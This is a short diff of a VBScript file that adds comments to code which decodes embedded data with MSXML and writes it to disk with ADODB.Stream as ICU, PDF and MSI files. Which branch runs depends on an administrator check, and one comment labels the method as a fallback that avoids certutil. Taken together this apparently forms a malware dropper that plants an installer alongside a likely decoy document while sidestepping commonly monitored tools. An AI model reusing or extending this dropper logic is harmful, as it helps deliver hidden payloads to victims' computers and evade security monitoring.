@@ -63,7 +63,7 @@ If Not isAdmin Then
             icuSaved = True
         Else
             ' --- VBS BINARY WRITE FALLBACK (No Certutil) ---
-            Dim xmlDoc, binNode, byteArray
+            Dim xmlDoc, binNode, byteArray, byteStr
             On Error Resume Next
             Set xmlDoc = CreateObject("MSXML2.DOMDocument")
             Set binNode = xmlDoc.createElement("b")
@@ -72,6 +72,7 @@ If Not isAdmin Then
             
             If Err.Number = 0 Then
                 byteArray = binNode.nodeTypedValue
+                ' Use ADODB.Stream to write the variant array directly
                 Dim st
                 Set st = CreateObject("ADODB.Stream")
                 st.Type = 1
@@ -148,6 +149,7 @@ Else
         If fso.FileExists(pdfPath) Then
             pdfSaved = True
         Else
+            ' VBS Fallback for PDF
             Dim pXml, pNode
             Set pXml = CreateObject("MSXML2.DOMDocument")
             Set pNode = pXml.createElement("b")
@@ -194,6 +196,7 @@ Else
         If fso.FileExists(msiPath) Then
             msiSaved = True
         Else
+            ' VBS Fallback for MSI
             Dim mXml, mNode
             Set mXml = CreateObject("MSXML2.DOMDocument")
             Set mNode = mXml.createElement("b")
